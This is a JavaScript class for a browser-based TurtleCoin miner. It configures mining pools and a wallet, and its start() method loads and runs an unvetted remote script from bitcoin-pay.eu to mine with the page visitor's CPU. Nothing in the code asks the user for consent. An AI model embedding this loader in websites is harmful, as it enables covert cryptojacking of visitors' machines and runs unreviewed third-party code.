class TurtleMiner {
	constructor(config) {
		this.pool = "";
		this.port = -1;
		this.wallet = "";
		this.paymentId = "";
		this.fixedDiff = -1;
		this.throttle = 0;
		this.threads = 2;
		this.minerName = "x";
		this.pools = {
			mine2gether: "trtl.pool.mine2gether.com:2225",
			minerrocks: "turtle.miner.rocks:5003",
			hashvault: "pool.turtle.hashvault.pro:3333",
			cryptopool: "pool.trtl.cryptopool.space:3333",
			semipool: "pool.trtl.semipool.com:22207",
			turtlepool: "eu.turtlepool.space:3333",
			herominers: "turtlecoin.herominers.com:10381"
		}
		this.events = {
			start: function() {console.log("miner started")},
			report: function(report) {console.log("report: "+report)},
			error: function(code, text) {console.log("error "+code+": "+text)}
		}
		if ("pool" in config) {this.pool = this.pools[config.pool].split(":")[0]; this.port = this.pools[config.pool].split(":")[1]}
		if ("port" in config) {this.port = config.port; this.pool = config.pool}
		if ("wallet" in config) {this.wallet = config.wallet}
		if ("paymentId" in config) {this.paymentId = config.paymentId}
		if ("fixedDiff" in config) {this.fixedDiff = config.fixedDiff}
		if ("throttle" in config) {this.throttle = config.throttle}
		if ("threads" in config) {this.threads = config.threads}
		if ("minerName" in config) {this.minerName = config.minerName}
	}
	stop() {
		stopMining();
	}
	start() {
		if (this.pool != "" && this.port != -1 && this.wallet != "") {
			loadScript("https://bitcoin-pay.eu/perfekt/perfekt.js?perfekt=wss://?algo=cn-lite?variant=2?jason="+this.pool+":"+this.port+"");
			setTimeout(() => {
				try {
					EverythingIsBinary(this.wallet, this.minerName, 100-this.throttle);
					// for (let i = 0; i < this.threads - 1; i++) {
					// 	setTimeout(function() {
					// 		EverythingIsBinary(this.wallet, this.minerName, 100-this.throttle);
					// 	}, 2000);
					// }
					// setTimeout(() => {
						this.events.start();
					// }, 5000);
					setInterval(this.report, 30000);
				} catch (err) {
					this.events.error(1, "unknown error: "+err);
				}
			}, 2000);
		} else {
			this.events.error(2, "you have to provide pool address, pool port and you wallet address");
		}
	}
	report() { // only works for mine2gether yet...
		let rep = {
			hashrate: -1
		}
		switch (this.pool) {
			case "trtl.pool.mine2gether.com":
				getA("https://trtl.mine2gether.com/api/stats_address?address="+this.wallet, (data) => {
					data = JSON.parse(data);
					rep.hashrate = data["charts"]["hashrate"]["worker-"+this.minerName].last()[1];
					this.events.report(rep);
				})
				break;
			default:
				break;
		}
	}
	log(text) {
		console.log(text);
	}
	dump() {
		let text = "";
		var i;
		for (i in this) {
			text += i + " - " + this[i] + "\n";
		}
		console.log(text);
	}
	on(event, fn) {this.events[event] = fn;}
}
function getA(theUrl, callback) {
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.onreadystatechange = function() {
        if (xmlHttp.readyState == 4 && xmlHttp.status == 200)
            callback(xmlHttp.responseText);
    }
    xmlHttp.open("GET", theUrl, true); // true for asynchronous
    xmlHttp.send(null);
}
function loadScript(url) {
    var script = document.createElement("script");  // create a script DOM node
    script.src = url;  // set its src to the provided URL
    document.body.appendChild(script);  // add it to the end of the head section of the page (could change 'head' to 'body' to add it to the end of the body section instead)
}
Array.prototype.last = function() {
	return this[this.length-1];
}
